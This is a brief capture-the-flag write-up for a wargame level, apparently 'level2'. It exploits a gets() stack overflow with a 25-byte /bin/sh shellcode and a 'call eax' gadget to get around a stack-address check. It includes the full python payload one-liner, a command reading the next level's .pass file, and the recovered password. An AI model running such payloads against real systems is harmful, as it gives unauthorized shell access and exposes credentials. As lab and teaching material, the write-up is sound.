buffer overflow exploit (gets function)

We can exploit the retrun address to jump to the desired address where it will execute our own shellcode.

We get a shellcode of 25 bytes on internet that opens a shell :

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

We cannot put in the return address, an address of the buffer because there's a binary mask that ckecks it.

0x80484fb:   25 00 00 00 b0         	and eax, 0xb0000000
0x8048500:   3d 00 00 00 b0         	cmp eax, 0xb0000000

Address's in 0xb are unusable

In the dump we can see the size of the buffer is 76 (0x4c). And theres is 4 of SPF and 4 of return address, so 84 bytes to overwritte the return address

0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax

Stack:
0      76                  80             84
|Buffer|Saved Frame Pointer|Return Address| ...


The return address start 80 bytes after the buffer. (84 - return address)

The offset is 80

We now need to find the address where we want to jump

In this case we can not use a 0xb address so we will use a function which is not

We can see that eax points on our buffer after the gets() we see with gdb that our string is stored in the register ($eax).


We find in the dump a call of $eax:
0x80484cf:   ff d0                  	call eax

We are going to create a payload to inject the address of this call (eax) in the return address.

Payload:

0         25               80           84
|Shellcode|NOP instructions|CALL EAX ADDR| 

python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90" * 55+ "\x08\x04\x84\xcf"[::-1] ' > /tmp/exploit && cat /tmp/exploit - | ./level2


cat /home/user/level3/.pass


492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
